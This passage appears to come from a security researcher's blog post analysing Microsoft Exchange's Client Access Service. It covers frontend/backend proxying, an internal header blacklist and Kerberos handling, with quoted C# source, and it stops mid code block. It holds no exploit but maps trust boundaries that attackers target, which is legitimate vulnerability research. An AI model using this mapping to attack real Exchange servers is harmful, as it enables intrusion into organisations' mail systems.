&lt;h1 id=&quot;where-is-the-new-attack-surface&quot;&gt;Where is the new attack surface&lt;/h1&gt;

&lt;p&gt;Exchange is a very sophisticated application. Since 2000, Exchange has released a new version every 3 years. Whenever Exchange releases a new version, the architecture changes a lot and becomes different. The changes of architecture and iterations make it difficult to upgrade an Exchange Server. In order to ensure the compatibility between the new architecture and old ones, several design debts were incurred to Exchange Server and led to the new attack surface we found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Where did we focus at Microsoft Exchange? We focused on the Client Access Service, CAS. CAS is a fundamental component of Exchange. Back to the version 2000/2003, CAS was an independent Frontend Server in charge of all the Frontend web rendering logics. After several renaming, integrating, and version differences, CAS has been downgraded to a service under the Mailbox Role. The &lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/architecture/architecture?view=exchserver-2019&quot;&gt;official documentation from Microsoft&lt;/a&gt; indicates that:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Mailbox servers contain the Client Access services that &lt;strong&gt;accept client connections for all protocols&lt;/strong&gt;. These frontend services are &lt;strong&gt;responsible for routing or proxying connections&lt;/strong&gt; to the corresponding backend services on a Mailbox server&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From the narrative you could realize the importance of CAS, and you could imagine how critical it is when bugs are found in such infrastructure. CAS was where we focused on, and where the attack surface appeared.&lt;/p&gt;

&lt;h1 id=&quot;the-cas-architecture&quot;&gt;The CAS architecture&lt;/h1&gt;

&lt;p&gt;CAS is the fundamental component in charge of accepting all the connections from the client side, no matter if it‚Äôs HTTP, POP3, IMAP or SMTP, and proxies the connections to the corresponding Backend Service. As a Web Security researcher, I focused on the Web implementation of CAS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The CAS web is built on Microsoft IIS. As you can see, there are two websites inside the IIS. The ‚ÄúDefault Website‚Äù is the Frontend we mentioned before, and the ‚ÄúExchange Backend‚Äù is where the business logic is. After looking into the configuration carefully, we notice that the Frontend is binding with ports 80 and 443, and the Backend is listening on ports 81 and 444. All the ports are binding with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;, which means anyone could access the Frontend and Backend of Exchange directly. Wouldn‚Äôt it be dangerous? Please keep this question in mind and we will answer that later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exchange implements the logic of Frontend and Backend via IIS module. There are several modules in Frontend and Backend to complete different tasks, such as the filter, validation, and logging. The Frontend must contain a Proxy Module. The Proxy Module picks up the HTTP request from the client side and adds some internal settings, then forwards the request to the Backend. As for the Backend, all the applications include the Rehydration Module, which is in charge of parsing Frontend requests, populating the client information back, and continuing to process the business logic. Later we will be elaborating how Proxy Module and Rehydration Module work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;frontend-proxy-module&quot;&gt;Frontend Proxy Module&lt;/h2&gt;

&lt;p&gt;Proxy Module chooses a handler based on the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ApplicationPath&lt;/code&gt; to process the HTTP request from the client side. For instance, visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/EWS&lt;/code&gt; will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EwsProxyRequestHandler&lt;/code&gt;, as for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/OWA&lt;/code&gt; will trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OwaProxyRequestHandler&lt;/code&gt;. All the handlers in Exchange inherit the class from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyRequestHandler&lt;/code&gt; and implement its core logic, such as how to deal with the HTTP request from the user, which URL from Backend to proxy to, and how to synchronize the information with the Backend. The class is also the most centric part of the whole Proxy Module, we will separate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyRequestHandler&lt;/code&gt; into 3 sections:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-reqeust-section&quot;&gt;Frontend Reqeust Section&lt;/h3&gt;

&lt;p&gt;The Request section will parse the HTTP request from the client and determine which cookie and header could be proxied to the Backend. Frontend and Backend relied on HTTP Headers to synchronize information and proxy internal status. Therefore, Exchange has defined a blacklist to avoid some internal Headers being misused.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ShouldCopyHeaderToServerRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-IsFromCafe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-SourceCafeServer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;msExchProxyUri&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-MSExchangeActivityCtx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;return-client-request-id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Equals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-For&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headerName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;StartsWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Backend-Diag-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OrdinalIgnoreCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
      &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHttpRequestBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsProbeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the last stage of Request, Proxy Module will call the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddProtocolSpecificHeadersToServerRequest&lt;/code&gt; implemented by the handler to add the information to be communicated with the Backend in the HTTP header. This section will also serialize the information from the current login user and put it in a new HTTP header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, which will be forwarded to the Backend later.&lt;/p&gt;

&lt;p&gt;For instance, If I log into Outlook Web Access (OWA) with the name Orange, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; that Frontend proxy to Backend will be:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-proxy-section&quot;&gt;Frontend Proxy Section&lt;/h3&gt;

&lt;p&gt;The Proxy Section first uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTargetBackendServerURL&lt;/code&gt; method to calculate which Backend URL should the HTTP request be forwarded to. Then initialize a new HTTP Client request with the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateServerRequest&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CreateServerRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targetUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseDefaultWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Proxy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NullWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServicePoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionLimit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServicePointConnectionLimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-FE-ClientIP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientIP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-For&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientProxyChainIPs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-Forwarded-Port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientEndpointResolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-MS-EdgeIP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Utilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetEdgeServerIpAsProxyHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpWebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Exchange will also generate a Kerberos ticket via the HTTP Service-Class of the Backend and put it in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorization&lt;/code&gt; header. This header is designed to prevent anonymous users from accessing the Backend directly. With the Kerberos Ticket, the Backend could validate the access from the Frontend.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\ProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProxyKerberosAuthentication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionGroupName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserHostAddress&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GccUtils&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AuthState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndFullAuth&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ShouldBackendRequestBeAnonymous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TestBackEndSupportEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TestBackEndUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
